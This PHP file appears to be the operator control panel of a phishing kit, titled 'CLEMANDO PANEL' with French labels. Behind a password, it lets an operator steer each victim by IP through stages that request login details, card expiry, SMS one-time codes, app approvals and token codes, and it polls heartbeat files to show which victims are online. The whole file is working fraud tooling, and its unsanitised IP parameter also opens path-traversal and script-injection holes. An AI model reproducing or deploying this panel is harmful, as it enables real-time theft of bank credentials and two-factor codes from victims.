<?php
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');

session_start();

$password = '6900a4c6f7cbb9957ed61f55c37be96e';

if($_POST['p']){
    setcookie('p',md5($_POST['p']));
    header('Location: ' . $_SERVER['PHP_SELF']. '?' . $_SERVER['QUERY_STRING']);
}

if ($_COOKIE['p'] !== $password) {
    die("<pre align=center><form method=post>Password<br><input type=password name=p style='background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='submit' style='border:none;background-color:#56AD15;color:#fff;cursor:pointer;'></form></pre>");
}

if ($_POST['step'] == "control") {
    $fp = fopen('users/'. $_POST['ip'] .'.txt', 'wb');

    if( $_POST['to'] == 'url' ) {
        $_POST['to'] = $_POST['to'] . '#|#' . $_POST['error'] . '#|#' . $_POST['url_text'];
    }
    if( $_POST['to'] == 'log' || $_POST['to'] == 'infos' || $_POST['to'] == 'otp' || $_POST['to'] == 'bill' || $_POST['to'] == 'done') {
        $_POST['to'] = $_POST['to'] . '#|#' . $_POST['error'];
    }
    if( $_POST['to'] == 'app' ) {
        $_POST['to'] = $_POST['to']. '#|#' . $_POST['app_text'];
    }
    if( $_POST['to'] == 'token' ) {
        $_POST['to'] = $_POST['to']. '#|#' . $_POST['sms_text'];
    }

    fwrite($fp, $_POST['to']);
    fclose($fp);
    header("location: M3tri-control.php?ip=" . $_POST['ip']);
    exit;
}

function get_server_info(){
    $server_addr = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : $_SERVER["HTTP_HOST"];
    return [
        "ip_address" => "Server IP : $server_addr <span class='strong'>|</span> Your IP : " . $_SERVER['REMOTE_ADDR'],
        "time_at_server" => "Time <span class='strong'>@</span> Server : " . date("d M Y H:i:s",time()),
        "uname" => php_uname(),
        "software" => (getenv('SERVER_SOFTWARE') ? getenv('SERVER_SOFTWARE') . " <span class='strong'>|</span> " : '') . "PHP " . phpversion()
    ];
}

function get_online_status($ip) {
    $path = "heartbeat/$ip.txt";
    if (file_exists($path)) {
        $lastPing = file_get_contents($path);
        $now = time();
        $diff = $now - $lastPing;
        if ($diff < 20) {
            return "<span class='badge badge-success' style='font-size: 1.2rem;'>🟢 En ligne</span>";
        } else {
            return "<span class='badge badge-danger' style='font-size: 1.2rem;'>🔴 Hors ligne</span>";
        }
    } else {
        return "<span class='badge badge-secondary' style='font-size: 1.2rem;'>❓ Aucune donnée</span>";
    }
}
?>
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
  <meta name="robots" content="noindex, nofollow, noimageindex, noarchive, nocache, nosnippet">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
  <link rel="icon" type="image/x-icon" href="favicon.ico" />
  <title>Control Panel</title>
  <style>
    body { background-color: #f8f9fa; }
  </style>
</head>
<body>
<div class="container mt-5">
  <div class="card shadow-lg">
    <div class="card-header bg-primary text-white d-flex justify-content-between align-items-center">
      <h4 class="mb-0 w-100 text-center font-weight-bold" style="font-family: 'Segoe UI', sans-serif; font-size: 1.7rem;">   🛡️ <span style="letter-spacing: 1px;">CLEMANDO PANEL</span> </h4>
      <div id="online-status">Chargement...</div>
    </div>
    <div class="card-body">
      <form method="post" action="">
        <input type="hidden" name="step" value="control">
        <input type="hidden" name="ip" value="<?php echo $_GET['ip']; ?>">

        <div class="custom-control custom-switch text-center mb-3">
          <input type="checkbox" class="custom-control-input" id="errorSwitch" onclick="checkbox();">
          <label class="custom-control-label" for="errorSwitch">Activer erreur</label>
          <input type="hidden" id="choice" name="error" value="off">
        </div>

        <div class="text-center">
          <button type="button" class="btn btn-info mb-2" data-toggle="collapse" data-target="#urlBlock">🔗 Custom URL</button>
          <div id="urlBlock" class="collapse">
            <textarea name="url_text" class="form-control mb-2" placeholder="http://..."></textarea>
            <button type="submit" class="btn btn-success" name="to" value="url">Envoyer URL</button>
          </div>
        </div>

        <div class="form-group d-flex flex-wrap justify-content-center">
          <button type="submit" class="btn btn-primary m-1" name="to" value="log">LOG</button>
          <button type="submit" class="btn btn-warning m-1" name="to" value="infos">EXP</button>
          <button type="submit" class="btn btn-danger m-1" name="to" value="otp">SMS</button>
          <button type="button" class="btn btn-dark m-1" data-toggle="collapse" data-target="#tokenBlock">🔐 Code Token</button>
          <button type="button" class="btn btn-secondary m-1" data-toggle="collapse" data-target="#appBlock">📱 APP</button>
          <button type="submit" class="btn btn-info m-1" name="to" value="info">INFO</button>
          <button type="submit" class="btn btn-success m-1" name="to" value="done">✅ Done</button>
        </div>

        <div id="tokenBlock" class="collapse mt-3">
          <textarea name="sms_text" class="form-control mb-2" placeholder="Code SMS..."></textarea>
          <button type="submit" class="btn btn-success" name="to" value="token">Envoyer Token</button>
        </div>

        <div id="appBlock" class="collapse mt-3">
          <textarea name="app_text" class="form-control mb-2" placeholder="App info..."></textarea>
          <button type="submit" class="btn btn-success" name="to" value="app">Envoyer App</button>
        </div>
      </form>
    </div>
    <div class="card-footer text-muted text-center">
      <?php
        foreach(get_server_info() as $info){
          echo "<div>$info</div>";
        }
      ?>
    </div>
  </div>
</div>

<script>
function checkbox() {
  var input = document.getElementById('choice');
  input.value = input.value === 'off' ? 'on' : 'off';
}

function updateStatus() {
  const ip = new URLSearchParams(window.location.search).get('ip');
  if (!ip) return;
  fetch('status.php?ip=' + ip)
    .then(res => res.text())
    .then(html => {
      document.getElementById('online-status').innerHTML = html;
    });
}
setInterval(updateStatus, 2000);
updateStatus();
</script>
<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
